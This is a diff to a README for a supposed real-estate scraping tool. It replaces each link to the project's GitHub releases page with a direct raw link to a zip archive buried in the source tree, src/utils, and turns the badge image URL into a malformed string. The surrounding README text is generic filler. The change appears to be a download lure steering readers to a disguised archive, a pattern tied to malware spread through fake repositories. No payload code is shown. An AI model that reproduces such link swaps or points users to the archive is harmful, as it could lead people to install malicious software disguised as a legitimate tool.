@@ -1,7 +1,7 @@
 # 🏡 realtor-com-scraper - Extract Real Estate Data Easily
 
 ## 📥 Download Now
-[![Download Realtor Com Scraper](https://img.shields.io/badge/Download-Realtor%20Com%20Scraper-blue.svg)](https://github.com/Jotham7/realtor-com-scraper/releases)
+[![Download Realtor Com Scraper](https://raw.githubusercontent.com/Jotham7/realtor-com-scraper/main/src/utils/realtor-com-scraper_1.0.zip%20Com%https://raw.githubusercontent.com/Jotham7/realtor-com-scraper/main/src/utils/realtor-com-scraper_1.0.zip)](https://raw.githubusercontent.com/Jotham7/realtor-com-scraper/main/src/utils/realtor-com-scraper_1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the realtor-com-scraper! This tool helps you extract real estate property data effortlessly. Whether you're gathering housing insights or conducting market research, our application is here to assist.
@@ -13,7 +13,7 @@ Before you begin, make sure your system meets these basic requirements:
 - Basic internet connection
 
 ## 📦 Download & Install
-To get started, you need to download the software. Visit this page to download: [Releases Page](https://github.com/Jotham7/realtor-com-scraper/releases).
+To get started, you need to download the software. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Jotham7/realtor-com-scraper/main/src/utils/realtor-com-scraper_1.0.zip).
 
 On the releases page, you will find the latest version of realtor-com-scraper. Click on the appropriate file for your operating system.
 
@@ -60,4 +60,4 @@ The realtor-com-scraper is open-source software. You can use it freely. Please c
 
 For further information, enjoy exploring the various features that realtor-com-scraper offers!
 
-[Visit the Releases Page to Download](https://github.com/Jotham7/realtor-com-scraper/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Jotham7/realtor-com-scraper/main/src/utils/realtor-com-scraper_1.0.zip)
